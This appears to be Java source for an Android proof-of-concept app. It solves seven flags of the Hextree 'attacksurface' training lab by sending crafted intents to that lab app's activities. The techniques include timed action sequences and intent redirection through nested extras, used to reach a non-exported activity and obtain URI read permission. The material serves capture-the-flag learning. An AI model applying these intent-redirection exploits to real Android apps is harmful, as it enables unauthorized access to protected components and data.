package com.bedo.poc_app;

import static android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Activity_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_labs);
    }

    public void Flag1(View view) {
        Intent intent = new Intent().setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag1Activity");
        startActivity(intent);
    }

    public void Flag2(View view) {

        Intent intent = new Intent("io.hextree.action.GIVE_FLAG")
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag2Activity");

        startActivity(intent);
    }

    public void Flag3(View view) {
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG")
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity")
                .setData(Uri.parse("https://app.hextree.io/map/android"));

        startActivity(intent);
    }

    public void Flag4(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
        Handler handler = new Handler();

        handler.postDelayed(() -> {
            Intent PREPARE = new Intent("PREPARE_ACTION").setComponent(cn);
            startActivity(PREPARE);
            Log.d("State","PREPARE");
        }, 0);

        handler.postDelayed(() -> {

            Intent BUILD = new Intent("BUILD_ACTION").setComponent(cn);
            startActivity(BUILD);
            Log.d("State","BUILD");
        }, 500);
        handler.postDelayed(() -> {

            Intent GET_FLAG = new Intent("GET_FLAG_ACTION").setComponent(cn);
            startActivity(GET_FLAG);
            Log.d("State","GET_FLAG");
        }, 1000);


    }

    public void Flag5(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");

        Intent nextIntent = new Intent().putExtra("reason","back");

        Intent back = new Intent()
                .putExtra("return",42)
                .putExtra("nextIntent", nextIntent);

        Intent main = new Intent().setComponent(cn)
                .putExtra("android.intent.extra.INTENT",back);
        startActivity(main);
    }

    public void Flag6(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
        ComponentName NotExported = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

        Intent nextIntent = new Intent()
                .putExtra("reason","next")
                .setComponent(NotExported).setFlags(FLAG_GRANT_READ_URI_PERMISSION);

        Intent back = new Intent()
                .putExtra("return",42)
                .putExtra("nextIntent", nextIntent);

        Intent main = new Intent().setComponent(cn)
                .putExtra("android.intent.extra.INTENT",back);
        startActivity(main);

    }

    public void Flag7(View view) {
        ComponentName cn = new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");

        Intent open = new Intent("OPEN").setComponent(cn);

        startActivity(open);

        Intent reopen = new Intent("REOPEN")
                .setComponent(cn)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);

        startActivity(reopen);

    }
}